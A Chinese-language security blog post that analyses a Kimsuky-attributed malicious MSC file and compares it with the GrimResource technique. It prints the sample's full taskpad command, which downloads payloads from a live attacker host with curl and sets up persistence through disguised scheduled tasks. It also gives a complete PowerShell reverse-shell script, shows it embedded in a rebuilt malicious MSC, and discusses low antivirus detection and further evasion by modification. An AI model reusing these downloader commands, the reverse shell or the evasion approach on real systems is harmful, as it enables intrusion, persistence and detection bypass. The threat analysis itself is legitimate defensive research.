@@ -1,0 +1,179 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h1 data-content="1" id="a9b673e4baf3e3c573a781dbb53d2395">从Kimsuky组织msc攻击样本到GrimResource</h1>
+<h2 data-content="1" id="3638d5f170491da2316d4453386d69fb">前言</h2>
+<p>近期笔者通过外网监测到一个Kimsuky组织的msc攻击样本，这里对样本进行分析，以及谈谈其利用的攻击技术</p>
+<pre><code>SHA256: 57e9b7d1c18684a4e8b3688c454e832833e063019ed808fd69186c4e20df930a</code></pre>
+<h2 data-content="1" id="89b9b06c7afd30402bbf4782f1651be4">msc文件</h2>
+<blockquote>
+<p>MSC(Microsoft Snap-In Control)文件，是微软管理控制台MMC(Microsoft Management Console)用来添加/删除的嵌入式管理单元文件。通常通过MMC来管理，可点击“文件”菜单中的“添加/删除管理单元”操作来管理当前系统中已经安装的MSC文件。可以点击开始/运行，然后输入下列文件名就可以打开相应的控制窗口。</p>
+</blockquote>
+<p>看到这个后缀，很多人可能已经想到了组策略编辑器(gpedit.msc)，该样本即是通过msc文件实现攻击，利用特制的管理保存控制台 (MSC) 文件来使用 Microsoft 管理控制台 ( MMC ) 获得完整的代码执行并逃避安全防御</p>
+<p>这项技术最早由Elastic 安全实验室在2024 年 6 月 6 日识别出上传到 VirusTotal 恶意软件扫描平台的工件（“ sccm-updater.msc ”），并将该方法命名为GrimResource ，前段时间热门的“银狐”黑产组织也曾利用过该项技术</p>
+<p>最初“GrimResource”技术的核心是利用了apds.dll库中存在的一个旧的跨站脚本（XSS）漏洞，通过在制作的MSC文件的StringTable部分适当地引用这个易受攻击的APDS资源，攻击者可以在mmc.exe的上下文中执行任意的JavaScript，本文中的样本攻击方式则有所不同</p>
+<h2 data-content="1" id="18a8f707f3ee71ae6891da4f9315a641">msc文件结构</h2>
+<p>首先大概认识一下msc文件，这里以组策略编辑器的msc文件为例：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240914114122-35aa9d42-724b-1.png"/></p>
+<p>msc文件本质上是一种XML格式的文件，其中包含一些定义的内容，这里以重要的部分进行解释</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?xml version="1.0"?&gt;</span>                                               # xml头
+<span class="nt">&lt;MMC_ConsoleFile&gt;</span>                                                   # 整个MMC控制台内容的标签
+    <span class="nt">&lt;ConsoleFileID&gt;</span>XXX<span class="nt">&lt;/ConsoleFileID&gt;</span>                               # msc文件id
+    <span class="nt">&lt;FrameState&gt;</span>xxx<span class="nt">&lt;/FrameState&gt;</span>                                        # 保存了管理控制台窗口的布局和状态信息
+    <span class="nt">&lt;Views&gt;</span>                                                        # 定义和保存管理控制台中的视图设置
+        <span class="nt">&lt;View&gt;</span>
+          XXX
+        <span class="nt">&lt;/View&gt;</span>
+    <span class="nt">&lt;/Views&gt;</span>
+    <span class="nt">&lt;VisualAttributes&gt;</span>                                              # 定义管理控制台（MMC）的视觉属性和界面元素的外观设置
+        <span class="nt">&lt;Icon</span> <span class="na">Index=</span><span class="s">"0"</span> <span class="na">File=</span><span class="s">"xxxx"</span><span class="nt">&gt;</span>                                 # 图标dll地址（dll/exe）
+          <span class="nt">&lt;Image</span> <span class="na">Name=</span><span class="s">"Large"</span> <span class="na">BinaryRefIndex=</span><span class="s">"0"</span><span class="nt">/&gt;</span>
+          <span class="nt">&lt;Image</span> <span class="na">Name=</span><span class="s">"Small"</span> <span class="na">BinaryRefIndex=</span><span class="s">"1"</span><span class="nt">/&gt;</span>
+          <span class="nt">&lt;Image</span> <span class="na">Name=</span><span class="s">"Large48x"</span> <span class="na">BinaryRefIndex=</span><span class="s">"2"</span><span class="nt">/&gt;</span>
+        <span class="nt">&lt;/Icon&gt;</span>
+    <span class="nt">&lt;/VisualAttributes&gt;</span>
+    <span class="nt">&lt;ScopeTree&gt;</span>                                                     # 定义和保存管理控制台的“范围树”（Scope Tree）部分的结构和配置。
+        <span class="nt">&lt;SnapinCache&gt;&lt;/SnapinCache&gt;</span>                                  # 用于缓存管理单元（snap-ins）的配置信息和状态。
+
+        <span class="nt">&lt;Nodes&gt;</span>                                                     # 视图中节点相关的信息
+            <span class="nt">&lt;Node</span> <span class="na">ID=</span><span class="s">"1"</span> <span class="na">ImageIdx=</span><span class="s">"0"</span> <span class="na">CLSID=</span><span class="s">"{xxx}"</span> <span class="na">Preload=</span><span class="s">"true"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;Nodes/&gt;</span>
+            <span class="nt">&lt;String</span> <span class="na">Name=</span><span class="s">"Name"</span> <span class="na">ID=</span><span class="s">"3"</span><span class="nt">/&gt;</span>
+            <span class="nt">&lt;Bitmaps&gt;</span>
+              <span class="nt">&lt;BinaryData</span> <span class="na">Name=</span><span class="s">"Small"</span> <span class="na">BinaryRefIndex=</span><span class="s">"3"</span><span class="nt">/&gt;</span>
+              <span class="nt">&lt;BinaryData</span> <span class="na">Name=</span><span class="s">"Large"</span> <span class="na">BinaryRefIndex=</span><span class="s">"4"</span><span class="nt">/&gt;</span>
+            <span class="nt">&lt;/Bitmaps&gt;</span>
+            <span class="nt">&lt;ComponentDatas&gt;</span>
+              <span class="nt">&lt;ComponentData&gt;</span>
+                <span class="nt">&lt;GUID</span> <span class="na">Name=</span><span class="s">"Snapin"</span><span class="nt">&gt;</span>{xxx}<span class="nt">&lt;/GUID&gt;</span>
+                <span class="nt">&lt;Stream</span> <span class="na">BinaryRefIndex=</span><span class="s">"5"</span><span class="nt">/&gt;</span>
+              <span class="nt">&lt;/ComponentData&gt;</span>
+            <span class="nt">&lt;/ComponentDatas&gt;</span>
+            <span class="nt">&lt;Components/&gt;</span>
+          <span class="nt">&lt;/Node&gt;</span>
+        <span class="nt">&lt;/Nodes&gt;</span>
+
+    <span class="nt">&lt;/ScopeTree&gt;</span>
+
+    <span class="nt">&lt;ConsoleTaskpads&gt;</span>                                               # 重点：用于定义和保存管理控制台（MMC）的任务面板配置，在控制台的特定部分显示任务、操作和快捷方式。
+        <span class="nt">&lt;ConsoleTaskpad&gt;</span>
+           <span class="nt">&lt;String</span> <span class="na">Name=</span><span class="s">"Name"</span> <span class="na">ID=</span><span class="s">"11"</span><span class="nt">/&gt;</span>
+           <span class="nt">&lt;String</span> <span class="na">Name=</span><span class="s">"Description"</span> <span class="na">ID=</span><span class="s">"12"</span><span class="nt">/&gt;</span>
+           <span class="nt">&lt;String</span> <span class="na">Name=</span><span class="s">"Tooltip"</span> <span class="na">Value=</span><span class="s">""</span><span class="nt">/&gt;</span>
+           <span class="nt">&lt;Tasks&gt;</span>                                                 # 任务相关设置
+                <span class="nt">&lt;Task</span> <span class="na">Type=</span><span class="s">"CommandLine（任务类型）"</span> <span class="na">Command=</span><span class="s">"cmd.exe（命令）"</span><span class="nt">&gt;</span>
+                  <span class="nt">&lt;String</span> <span class="na">Name=</span><span class="s">"Name"</span> <span class="na">ID=</span><span class="s">"13"</span><span class="nt">/&gt;</span>
+                  <span class="nt">&lt;String</span> <span class="na">Name=</span><span class="s">"Description"</span> <span class="na">ID=</span><span class="s">"14"</span><span class="nt">/&gt;</span>
+                  <span class="nt">&lt;Symbol&gt;</span>
+                    <span class="nt">&lt;Image</span> <span class="na">Name=</span><span class="s">"Small"</span> <span class="na">BinaryRefIndex=</span><span class="s">"6"</span><span class="nt">/&gt;</span>
+                    <span class="nt">&lt;Image</span> <span class="na">Name=</span><span class="s">"Large"</span> <span class="na">BinaryRefIndex=</span><span class="s">"7"</span><span class="nt">/&gt;</span>
+                  <span class="nt">&lt;/Symbol&gt;</span>
+                  <span class="nt">&lt;CommandLine</span> <span class="na">Directory=</span><span class="s">""</span> <span class="na">WindowState=</span><span class="s">"Minimized（窗口最小化）"</span> <span class="na">Params=</span><span class="s">"/c calc（参数）"</span><span class="nt">/&gt;</span>
+                <span class="nt">&lt;/Task&gt;</span>
+            <span class="nt">&lt;/Tasks&gt;</span>
+        <span class="nt">&lt;/ConsoleTaskpad&gt;</span>
+    <span class="nt">&lt;/ConsoleTaskpads&gt;</span>
+
+    <span class="nt">&lt;ViewSettingsCache&gt;</span>xxx<span class="nt">&lt;/ViewSettingsCache&gt;</span>                      # 缓存管理控制台（MMC）的视图设置
+    <span class="nt">&lt;ColumnSettingsCache&gt;&lt;/ColumnSettingsCache&gt;</span>                     # 缓存和保存管理控制台（MMC）中表格视图的列设置
+    <span class="nt">&lt;StringTables&gt;</span>                                               # 定义和管理控制台界面中的字符串资源，用于界面中的标签、菜单项、按钮文字以及其他显示文本
+        <span class="nt">&lt;IdentifierPool</span> <span class="na">AbsoluteMin=</span><span class="s">"1"</span> <span class="na">AbsoluteMax=</span><span class="s">"65535"</span> <span class="na">NextAvailable=</span><span class="s">"15"</span><span class="nt">/&gt;</span>
+        <span class="nt">&lt;StringTable&gt;</span>
+          <span class="nt">&lt;GUID&gt;</span>{xxxx}<span class="nt">&lt;/GUID&gt;</span>
+          <span class="nt">&lt;Strings&gt;</span>
+            <span class="nt">&lt;String</span> <span class="na">ID=</span><span class="s">"1"</span> <span class="na">Refs=</span><span class="s">"1"</span><span class="nt">&gt;</span>Local Group Policy Editor<span class="nt">&lt;/String&gt;</span>
+            <span class="nt">&lt;String</span> <span class="na">ID=</span><span class="s">"2"</span> <span class="na">Refs=</span><span class="s">"1"</span><span class="nt">&gt;</span>Favorites<span class="nt">&lt;/String&gt;</span>
+            <span class="nt">&lt;String</span> <span class="na">ID=</span><span class="s">"3"</span> <span class="na">Refs=</span><span class="s">"1"</span><span class="nt">&gt;</span>Local Computer Policy<span class="nt">&lt;/String&gt;</span>
+            <span class="nt">&lt;String</span> <span class="na">ID=</span><span class="s">"4"</span> <span class="na">Refs=</span><span class="s">"2"</span><span class="nt">&gt;</span>Console Root<span class="nt">&lt;/String&gt;</span>
+          <span class="nt">&lt;/Strings&gt;</span>
+        <span class="nt">&lt;/StringTable&gt;</span>
+    <span class="nt">&lt;/StringTables&gt;</span>
+    <span class="nt">&lt;BinaryStorage&gt;</span>                                             # 用于存储二进制数据
+        <span class="nt">&lt;Binary</span> <span class="na">Name=</span><span class="s">"CONSOLE_FILE_ICON_LARGE"</span><span class="nt">&gt;</span>
+        Base64 编码或其他编码方式
+        <span class="nt">&lt;/Binary&gt;</span>
+    <span class="nt">&lt;/BinaryStorage&gt;</span>
+<span class="nt">&lt;/MMC_ConsoleFile&gt;</span>
+</pre></div>
+<h2 data-content="1" id="0422deac5f1f55202fef2cc550e671cd">样本分析</h2>
+<p>我们已经大致了解了msc文件的结构，有兴趣的话之后会专门写一篇文章来分析</p>
+<p>现在开始分析样本</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240914114134-3d3e0ab2-724b-1.png"/></p>
+<p>这里可以看到使用了word的图标用以迷惑受害者，看样子应该是针对韩国地区发起的攻击</p>
+<p>文本格式打开样本</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240914114145-43847d66-724b-1.png"/></p>
+<p>总体结构和刚刚分析的大致一样，其中<code>MMC_ConsoleFile-&gt;VisualAttributes-&gt;Icon</code>部分引用了word的路径，也就是图标部分</p>
+<p>往下翻来到重点部分</p>
+<h3 data-content="1" id="a9f18294a8cac723cb601ba780693ba3">核心代码</h3>
+<div class="highlight"><pre><span></span><span class="nt">&lt;ConsoleTaskpads&gt;</span>
+    <span class="nt">&lt;ConsoleTaskpad</span> <span class="na">ListSize=</span><span class="s">"Medium"</span> <span class="na">IsNodeSpecific=</span><span class="s">"true"</span> <span class="na">ReplacesDefaultView=</span><span class="s">"false"</span> <span class="na">NoResults=</span><span class="s">"true"</span> <span class="na">DescriptionsAsText=</span><span class="s">"true"</span> <span class="na">NodeType=</span><span class="s">"{C96401CE-0E17-11D3-885B-00C04F72C717}"</span> <span class="na">ID=</span><span class="s">"{656F3A6A-1A63-4FC4-9C9B-4B75AF6DF3A3}"</span><span class="nt">&gt;</span>
+      <span class="nt">&lt;String</span> <span class="na">Name=</span><span class="s">"Name"</span> <span class="na">ID=</span><span class="s">"11"</span><span class="nt">/&gt;</span>
+      <span class="nt">&lt;String</span> <span class="na">Name=</span><span class="s">"Description"</span> <span class="na">ID=</span><span class="s">"12"</span><span class="nt">/&gt;</span>
+      <span class="nt">&lt;String</span> <span class="na">Name=</span><span class="s">"Tooltip"</span> <span class="na">Value=</span><span class="s">""</span><span class="nt">/&gt;</span>
+      <span class="nt">&lt;Tasks&gt;</span>
+        <span class="nt">&lt;Task</span> <span class="na">Type=</span><span class="s">"CommandLine"</span> <span class="na">Command=</span><span class="s">"cmd.exe"</span><span class="nt">&gt;</span>
+          <span class="nt">&lt;String</span> <span class="na">Name=</span><span class="s">"Name"</span> <span class="na">ID=</span><span class="s">"13"</span><span class="nt">/&gt;</span>
+          <span class="nt">&lt;String</span> <span class="na">Name=</span><span class="s">"Description"</span> <span class="na">ID=</span><span class="s">"14"</span><span class="nt">/&gt;</span>
+          <span class="nt">&lt;Symbol&gt;</span>
+            <span class="nt">&lt;Image</span> <span class="na">Name=</span><span class="s">"Small"</span> <span class="na">BinaryRefIndex=</span><span class="s">"6"</span><span class="nt">/&gt;</span>
+            <span class="nt">&lt;Image</span> <span class="na">Name=</span><span class="s">"Large"</span> <span class="na">BinaryRefIndex=</span><span class="s">"7"</span><span class="nt">/&gt;</span>
+          <span class="nt">&lt;/Symbol&gt;</span>
+          <span class="nt">&lt;CommandLine</span> <span class="na">Directory=</span><span class="s">""</span> <span class="na">WindowState=</span><span class="s">"Minimized"</span> <span class="na">Params=</span><span class="s">"/c mode 15,1&amp;amp;curl -o &amp;quot;c:\users\public\music\default1&amp;quot; &amp;quot;https://petssecondchance.larcity.dev/modules/mod_custom/tmpl/andy/css.php?na=xam1&amp;quot;&amp;amp;curl -o &amp;quot;c:\users\public\pictures\default1&amp;quot; &amp;quot;https://petssecondchance.larcity.dev/modules/mod_custom/tmpl/andy/css.php?na=sam1&amp;quot;&amp;amp;move /y &amp;quot;c:\users\public\music\default1&amp;quot; &amp;quot;c:\users\public\music\default1.xml&amp;quot;&amp;amp;start explorer &amp;quot;https://docs.google.com/document/d/1Z96Gq8lf7h688L0GeZMgAhjipRX1GLmL/edit&amp;quot;&amp;amp;schtasks /create /tn TerminalServiceUpdater /xml c:\users\public\music\default1.xml /f&amp;amp;curl -o &amp;quot;c:\users\public\music\default2&amp;quot; &amp;quot;https://petssecondchance.larcity.dev/modules/mod_custom/tmpl/andy/css.php?na=xam2&amp;quot;&amp;amp;curl -o &amp;quot;c:\users\public\pictures\default2&amp;quot; &amp;quot;https://petssecondchance.larcity.dev/modules/mod_custom/tmpl/andy/css.php?na=sam2&amp;quot;&amp;amp;move /y &amp;quot;c:\users\public\music\default2&amp;quot; &amp;quot;c:\users\public\music\default2.xml&amp;quot;&amp;amp;move /y &amp;quot;c:\users\public\pictures\default1&amp;quot; &amp;quot;c:\users\public\pictures\default1.vbs&amp;quot;&amp;amp;schtasks /create /tn TermServiceUpdater /xml c:\users\public\music\default2.xml /f&amp;amp;move /y &amp;quot;c:\users\public\pictures\default2&amp;quot; &amp;quot;c:\users\public\pictures\default2.vbs&amp;quot;"</span><span class="nt">/&gt;</span>
+        <span class="nt">&lt;/Task&gt;</span>
+      <span class="nt">&lt;/Tasks&gt;</span>
+      <span class="nt">&lt;BookMark</span> <span class="na">Name=</span><span class="s">"TargetNode"</span> <span class="na">NodeID=</span><span class="s">"1"</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;/ConsoleTaskpad&gt;</span>
+  <span class="nt">&lt;/ConsoleTaskpads&gt;</span>
+</pre></div>
+<p>刚刚提到<code>ConsoleTaskpads</code>是MMC的任务面板配置</p>
+<p>其中<code>&lt;Task Type="CommandLine" Command="cmd.exe"&gt;</code>部分指定了类型为命令行，并且调用了cmd.exe</p>
+<p>继续跟到下面<code>CommandLine</code>部分，首先制定了窗口初始状态为最小化，然后通过Params指定了命令行参数</p>
+<pre><code>/c mode 15,1
+curl -o "c:\users\public\music\default1" "https://petssecondchance.larcity.dev/modules/mod_custom/tmpl/andy/css.php?na=xam1"
+curl -o "c:\users\public\pictures\default1" "https://petssecondchance.larcity.dev/modules/mod_custom/tmpl/andy/css.php?na=sam1"
+move /y "c:\users\public\music\default1" "c:\users\public\music\default1.xml"
+start explorer "https://docs.google.com/document/d/1Z96Gq8lf7h688L0GeZMgAhjipRX1GLmL/edit"
+schtasks /create /tn TerminalServiceUpdater /xml c:\users\public\music\default1.xml /f
+curl -o "c:\users\public\music\default2" "https://petssecondchance.larcity.dev/modules/mod_custom/tmpl/andy/css.php?na=xam2"
+curl -o "c:\users\public\pictures\default2" "https://petssecondchance.larcity.dev/modules/mod_custom/tmpl/andy/css.php?na=sam2"
+move /y "c:\users\public\music\default2" "c:\users\public\music\default2.xml"
+move /y "c:\users\public\pictures\default1" "c:\users\public\pictures\default1.vbs"
+schtasks /create /tn TermServiceUpdater /xml c:\users\public\music\default2.xml /f
+move /y "c:\users\public\pictures\default2" "c:\users\public\pictures\default2.vbs"</code></pre>
+<p>第一行指定了命令行窗口模式为15,1（黑背景色白前景色，显示1行）</p>
+<p>接下来两行下载了两份文件（这里以参数为称，xam1和xam1）并移动到music和picture目录的default1，现在发现两份文件地址均已经删除</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240914114156-4a75c242-724b-1.png"/></p>
+<p>随后将music目录下的default1改为了xml格式，紧接着打开资源管理器访问了<code>https://docs.google.com/document/d/1Z96Gq8lf7h688L0GeZMgAhjipRX1GLmL/edit</code>，现在已被谷歌文档删除，推测为和用来伪装的字符串相关话题内容，用以迷惑受害者以为仅打开了链接</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240914114202-4de507a8-724b-1.png"/></p>
+<p>访问链接后通过schtasks命令以default1.xml为模板创建了计划任务<code>TerminalServiceUpdater</code></p>
+<pre><code>schtasks /create /tn TerminalServiceUpdater /xml c:\users\public\music\default1.xml /f</code></pre>
+<p>后面又下载了两份文件，现也已删除，后面就是相同的操作这里不再赘述</p>
+<p>其中sam1和sam2最后改名为vbs，这里应该才是计划任务最终执行的payload，因为都被删除了这里就不多做分析</p>
+<h2 data-content="1" id="86aae875b1a5a6c1bafbb91208e3d580">GrimResource?</h2>
+<p>最开始提到了GrimResource最初是通过利用apds.dll库中存在的一个旧的跨站脚本（XSS）漏洞在mmc.exe的上下文中执行任意js代码，而本文的攻击手段则有所不同，所以严格意义上来说该样本并不是使用了GrimResource技术，不过我们还是看看作为攻击手段的有效性</p>
+<h3 data-content="1" id="be0dfa55e64658eef09ecef8b832331b">异同</h3>
+<ul>
+<li>同：均是利用msc文件为载体，可以有效绕过安全软件</li>
+<li>异：GrimResource是利用apds.dll库的漏洞和DotNetToJs技术，随着版本更新会有一定局限性；该样本中则是利用msc文件本身的特性，创建了一个迷惑性的msc操作快捷方式，引导受害者手动点击（更接近于钓鱼）</li>
+</ul>
+<h3 data-content="1" id="64fb65e7a61a1d4bdcf1bc2d747c921a">复现</h3>
+<p>我们这里以该样本为基础，尝试自己构建一个新的恶意msc文件用以反弹shell</p>
+<p>首先构造一个反弹用的powershell脚本</p>
+<div class="highlight"><pre><span></span><span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">Sockets</span><span class="p">.</span><span class="n">TCPClient</span><span class="p">(</span><span class="s2">"127.0.0.1"</span><span class="p">,</span><span class="n">14512</span><span class="p">);</span><span class="nv">$stream</span> <span class="p">=</span> <span class="nv">$client</span><span class="p">.</span><span class="n">GetStream</span><span class="p">();</span><span class="no">[byte[]]</span><span class="nv">$bytes</span> <span class="p">=</span> <span class="n">0</span><span class="p">..</span><span class="n">65535</span><span class="p">|%{</span><span class="n">0</span><span class="p">};</span><span class="k">while</span><span class="p">((</span><span class="nv">$i</span> <span class="p">=</span> <span class="nv">$stream</span><span class="p">.</span><span class="n">Read</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span> <span class="n">0</span><span class="p">,</span> <span class="nv">$bytes</span><span class="p">.</span><span class="n">Length</span><span class="p">))</span> <span class="o">-ne</span> <span class="n">0</span><span class="p">){;</span><span class="nv">$data</span> <span class="p">=</span> <span class="p">(</span><span class="nb">New-Object</span> <span class="n">-TypeName</span> <span class="n">System</span><span class="p">.</span><span class="n">Text</span><span class="p">.</span><span class="n">ASCIIEncoding</span><span class="p">).</span><span class="n">GetString</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span><span class="n">0</span><span class="p">,</span> <span class="nv">$i</span><span class="p">);</span><span class="nv">$sendback</span> <span class="p">=</span> <span class="p">(</span><span class="n">iex</span> <span class="nv">$data</span> <span class="n">2</span><span class="p">&gt;&amp;</span><span class="n">1</span> <span class="p">|</span> <span class="nb">Out-String</span> <span class="p">);</span><span class="nv">$sendback2</span>  <span class="p">=</span> <span class="nv">$sendback</span> <span class="p">+</span> <span class="s2">"PS "</span> <span class="p">+</span> <span class="p">(</span><span class="n">pwd</span><span class="p">).</span><span class="n">Path</span> <span class="p">+</span> <span class="s2">"&gt; "</span><span class="p">;</span><span class="nv">$sendbyte</span> <span class="p">=</span> <span class="p">(</span><span class="no">[text.encoding]</span><span class="p">::</span><span class="n">ASCII</span><span class="p">).</span><span class="n">GetBytes</span><span class="p">(</span><span class="nv">$sendback2</span><span class="p">);</span><span class="nv">$stream</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="nv">$sendbyte</span><span class="p">,</span><span class="n">0</span><span class="p">,</span><span class="nv">$sendbyte</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span><span class="nv">$stream</span><span class="p">.</span><span class="n">Flush</span><span class="p">()};</span><span class="nv">$client</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>
+</pre></div>
+<p>powershell编码</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240914114214-54e241e2-724b-1.png"/></p>
+<p>接下来带入样本中，开启nc监听</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240914114221-58df391c-724b-1.png"/></p>
+<p>成功开启反弹</p>
+<h3 data-content="1" id="ff96c1d66e711554e96955f8ec5c1873">查杀率</h3>
+<p>微步：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240914114229-5da29b4c-724b-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240914114233-6071bfba-724b-1.png"/></p>
+<p>可以看到目前微步的查杀率还是非常低的，并且主要是powershell反弹shell的特征</p>
+<p>VT：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240914114240-64495cba-724b-1.png"/></p>
+<p>VT则因为国外平台的原因已被标记，并且笔者这里跟原样本特征重合度过高，导致几乎都正常识别为了Kimsuky相关（但也只有12/63），实际上自己修改后查杀率还会进一步降低</p>
+<h2 data-content="1" id="bef85864199e736f9134a7db93235381">总结</h2>
+<p>GrimResource作为一种新型的攻击手段，想必一段时间内仍然会活跃在大众视野中，其利用手段也远远不止最初的用法，相信也能给攻击和防守视角带来一些启发</p>
+</div>
+</div>
